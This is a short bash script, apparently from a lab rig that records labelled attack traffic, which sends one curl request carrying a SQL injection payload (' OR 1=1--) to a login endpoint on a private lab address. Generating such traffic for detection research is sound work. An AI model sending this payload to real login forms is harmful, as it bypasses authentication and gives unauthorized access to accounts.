#!/usr/bin/env bash
# ATK-03 variant a: SQL injection on the login form, one request, curl's own user agent (loud).
# Runs inside the rig's tools container only (recording/record.sh).
# tool: curl 8.x
# label: loud: one injected login, curl user agent
set -eu
curl -s -X POST http://10.66.0.10/rest/user/login \
  -H 'Content-Type: application/json' \
  --data-raw '{"email":"'"'"' OR 1=1--","password":"x"}'
echo
